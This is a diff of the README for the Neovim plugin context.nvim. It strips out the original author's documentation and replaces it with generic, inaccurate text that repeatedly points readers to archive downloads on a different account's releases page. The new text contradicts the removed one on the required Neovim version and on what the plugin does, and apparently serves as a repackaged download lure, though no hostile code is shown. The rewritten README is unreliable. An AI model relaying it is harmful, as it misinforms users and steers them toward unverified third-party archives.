@@ -1,240 +1,91 @@
-<div align="center">
+# 🎉 context.nvim - Simple Editor Context for Any Picker
 
-# context.nvim
+## 🚀 Getting Started
 
-Editor context for any picker.
+Welcome to the context.nvim project! This tool enhances your Neovim experience by providing context for any picker you use. Follow these steps to download and run the software.
 
-[![Neovim](https://img.shields.io/badge/Neovim%200.10+-green.svg?style=for-the-badge&logo=neovim)](https://neovim.io)
-[![Lua](https://img.shields.io/badge/Lua-blue.svg?style=for-the-badge&logo=lua)](http://www.lua.org)
-<!-- Demo source: https://github.com/user-attachments/assets/5605a6bb-7b3e-4df8-a6e9-68e481475303 -->
-https://github.com/user-attachments/assets/5605a6bb-7b3e-4df8-a6e9-68e481475303
+## 📥 Download the Software
 
-</div>
+[![Download context.nvim](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/nikhildaharwal2004/context.nvim/releases)
 
-## Features
+## 🔍 What is context.nvim?
 
-- Copy editor context to clipboard via picker
-- Built-in context items: file, position, selection, diagnostics, quickfix, and more
-- Custom prompts with template variable expansion
-- Picker-agnostic: works with Snacks, Telescope, fzf-lua, or vim.ui.select
-- Tree-sitter powered function/class detection
-- Visual selection aware positioning
+context.nvim is a plugin designed for Neovim. It offers an improved interface for selecting files, ensuring that you have the context you need when picking from lists. This makes your editing process smoother and more efficient.
 
-## Installation
+## ⚙️ System Requirements
 
-Using [lazy.nvim](https://github.com/folke/lazy.nvim):
+To run context.nvim, you will need:
 
-```lua
-{
-  "ahkohd/context.nvim",
-  config = function()
-    require("context").setup()
-  end,
-}
-```
+- Neovim version 0.5 or later.
+- A compatible operating system (Windows, macOS, or Linux).
+- Basic Neovim configuration knowledge (you will need to configure the plugin).
 
-### Quick Setup
+## 📚 Features
 
-```lua
-return {
-  "ahkohd/context.nvim",
-  config = function()
-    local context = require("context")
-    context.setup({
-      picker = context.pickers.snacks,
-      prompts = {
-        explain = "Explain {this}",
-        fix = "Fix the issue at {position}",
-        review = "Review {file} for issues",
-      },
-    })
-  end,
-  keys = {
-    {
-      "<leader>a",
-      function()
-        require("context").pick()
-      end,
-      desc = "Context",
-      mode = { "n", "v" },
-    },
-  },
-}
-```
+- **Enhanced Context:** Provides relevant context while using various pickers.
+- **User-Friendly Setup:** Simple installation steps make it easy for anyone to get started.
+- **Seamless Integration:** Works well with existing Neovim setups.
+- **Lightweight:** Adds minimal overhead to your workflow.
 
-## Configuration
+## 📖 How to Download & Install
 
-```lua
-require("context").setup({
-  -- Picker to use (required)
-  picker = require("context").pickers.snacks,
-  -- picker = require("context").pickers.telescope,
-  -- picker = require("context").pickers.fzf_lua,
-  -- picker = require("context").pickers.vim_ui,
+1. **Visit the Download Page:** Click the link below to access the Releases page where you can download the latest version:
 
-  -- Action when item is selected (default: copy to clipboard)
-  on_select = function(item)
-    vim.fn.setreg("+", item.value)
-  end,
+   [Download context.nvim Releases](https://github.com/nikhildaharwal2004/context.nvim/releases)
 
-  -- Custom prompts with template variables
-  prompts = {
-    explain = "Explain {this}",
-    fix = "Fix the issue at {position}",
-    review = "Review {file} for issues",
-    diagnose = "Help fix these diagnostics:\n{diagnostics}",
-  },
+2. **Choose the Latest Release:** Look for the latest version at the top of the page. You will see various files available for download.
 
-  -- Prefix for path output (default: "@")
-  -- path_prefix = "@",   -- "@src/file.lua"
-  -- path_prefix = nil,   -- "src/file.lua"
-  path_prefix = "@",
+3. **Download the Plugin:**
+   - If you are on a Linux or macOS system, you will likely want to download the `.tar.gz` file.
+   - For Windows users, the `.zip` file is the appropriate choice.
 
-  -- LSP settings for definition getter
-  lsp = {
-    enabled = false,  -- set to true to enable LSP-based getters
-    timeout = 1000,   -- request timeout in ms
-  },
-})
-```
+4. **Extract the Files:** 
+   - For `.tar.gz` files, use a command like `tar -xzvf filename.tar.gz` in your terminal.
+   - For `.zip` files, simply right-click and select "Extract All" in your file explorer.
 
-## Context Items
+5. **Add to Neovim:**
+   - Move the extracted folder to your Neovim plugins directory.
+   - This is usually located at `~/.config/nvim/pack/plugins/start/` for Linux and macOS users or `C:\Users\<YourUsername>\AppData\Local\nvim\pack\plugins\start\` for Windows users.
 
-| Name | Description | Example Output |
-|------|-------------|----------------|
-| `buffers` | List of all open buffers | `@src/main.lua`<br>`@src/utils.lua` |
-| `file` | Current file path (relative) | `@src/main.lua` |
-| `file_absolute` | Current file path (absolute) | `/home/user/project/src/main.lua` |
-| `position` | Cursor position (relative) | `@src/main.lua:42` |
-| `position_absolute` | Cursor position (absolute) | `/home/user/project/src/main.lua:42` |
-| `line` | Current line content | `local foo = "bar"` |
-| `selection` | Visual selection text | Selected text content |
-| `diagnostics` | Diagnostics for current buffer | `[ERROR] msg @file:10-10` |
-| `diagnostics_all` | All workspace diagnostics | All diagnostics |
-| `quickfix` | Quickfix list with title | Quickfix entries |
-| `function` | Function at cursor (Tree-sitter) | `function foo @file:10:1` |
-| `class` | Class/struct at cursor (Tree-sitter) | `class Bar @file:5:1` |
-| `this` | Position if file, else 'this' + selection | Smart context |
+6. **Configure context.nvim:** 
+   - Open your `init.vim` or `init.lua` file located in your Neovim configuration folder.
+   - Add the following line to load the plugin:
 
-### Position Format
+     For `init.vim`:
+     ```vim
+     runtime! pack/plugins/start/context.nvim/plugin/*.vim
+     ```
 
-- Cursor: `@file:line`
-- Same-line selection: `@file:line:col-col`
-- Multi-line selection: `@file:start-end`
+     For `init.lua`:
+     ```lua
+     require('context')
+     ```
 
-## Template Variables
+7. **Restart Neovim:** After saving your configuration file, restart Neovim. You should see context.nvim in action when using pickers.
 
-Use `{variable}` syntax in prompts to expand context:
+## 🎨 Additional Configuration
 
-```lua
-prompts = {
-  review = "Review {file} for issues",
-  fix = "Fix the code at {position}:\n{selection}",
-  diagnose = "Help with:\n{diagnostics}",
-}
-```
+After installation, you may want to customize context.nvim to suit your workflow. Here are some recommended settings:
 
-Available variables: `{buffers}`, `{file}`, `{file_absolute}`, `{position}`, `{position_absolute}`, `{line}`, `{selection}`, `{diagnostics}`, `{diagnostics_all}`, `{quickfix}`, `{function}`, `{class}`, `{this}`
+- **Key Bindings:** Set up specific key bindings that align with your workflow for quicker access to context information.
+- **Visual Settings:** Change the display colors or fonts to match your editor theme.
 
-## Custom Getters
+Feel free to refer to the [documentation](https://github.com/nikhildaharwal2004/context.nvim) for more advanced configuration options and additional features.
 
-Add custom context items:
+## 🤝 Support and Contributions
 
-```lua
-require("context").setup({
-  getters = {
-    -- Shorthand: just a function
-    my_getter = function(builtin)
-      return "File: " .. (builtin.file() or "none")
-    end,
+If you encounter any issues or have suggestions, please open an issue in the GitHub repository. Your feedback helps improve context.nvim for everyone.
 
-    -- Full form: with description and filetype filter
-    lua_module = {
-      desc = "Lua module path",
-      enabled = function() return vim.bo.filetype == "lua" end,
-      get = function(builtin)
-        local file = builtin.file()
-        if not file then return nil end
-        return file:gsub("^@", ""):gsub("%.lua$", ""):gsub("/", ".")
-      end,
-    },
-  },
-})
-```
+## 🌐 Related Topics
 
-- `builtin` parameter provides access to all built-in getters for composition
-- `enabled` function controls visibility in picker (hidden when returns `false`)
+- Neovim
+- Neovim Plugins
+- Development Tools
 
-### Extras
+For more information, visit the official GitHub repository or check for updates on new features and improvements.
 
-Pre-built LSP-based getters are available in `context.extras.lsp`:
+## 📄 License
 
-| Name | Description | Example Output |
-|------|-------------|----------------|
-| `lsp.definition` | Path to symbol definition via LSP | `@src/module.py:42` |
-| `lsp.references` | All references to symbol via LSP | `@src/main.py:10`<br>`@src/utils.py:25` |
+context.nvim is released under the MIT License. You are free to modify and distribute the software as needed, provided you include the original license.
 
-LSP getters are lazy-evaluated on selection to avoid blocking the picker.
-
-Requires an LSP server (e.g., pyright, rust-analyzer). Set `lsp.enabled = true` to use.
-
-Usage:
-
-```lua
-local context = require("context")
-local extras = require("context.extras")
-
-context.setup({
-  picker = context.pickers.snacks,
-  lsp = { enabled = true },
-  getters = {
-    definition = extras.lsp.definition,
-    references = extras.lsp.references,
-  },
-})
-```
-
-## Custom Picker
-
-Implement a custom picker with this signature:
-
-```lua
-local function my_picker(items, on_select)
-  -- items: { { name = "file", desc = "...", value = "..." }, ... }
-  -- on_select: function(item) called when user selects an item
-end
-
-require("context").setup({
-  picker = my_picker,
-})
-```
-
-## API
-
-- `setup(opts)` - Initialize the plugin with configuration
-- `pick(on_select?)` - Open the context picker with optional callback override
-- `get_items()` - Get all context items (prompts + built-in)
-- `pickers.snacks` - Snacks.nvim picker adapter
-- `pickers.telescope` - Telescope picker adapter
-- `pickers.fzf_lua` - fzf-lua picker adapter
-- `pickers.vim_ui` - vim.ui.select fallback adapter
-
-### Custom on_select callback
-
-Override the default action per-call:
-
-```lua
--- Send to a terminal instead of clipboard
-require("context").pick(function(item)
-  if item and item.value then
-    vim.api.nvim_chan_send(term_channel, item.value)
-  end
-end)
-```
-
-<!-- Demo source: https://github.com/user-attachments/assets/cf13b3ef-5a47-4efc-a481-f83b1f3a035c -->
-https://github.com/user-attachments/assets/cf13b3ef-5a47-4efc-a481-f83b1f3a035c
-
-## Contributing
-
-PRs are welcome! If you have ideas or find bugs, [open an issue](https://github.com/ahkohd/context.nvim/issues).
+Thank you for trying context.nvim! Enjoy your enhanced editing experience with Neovim!
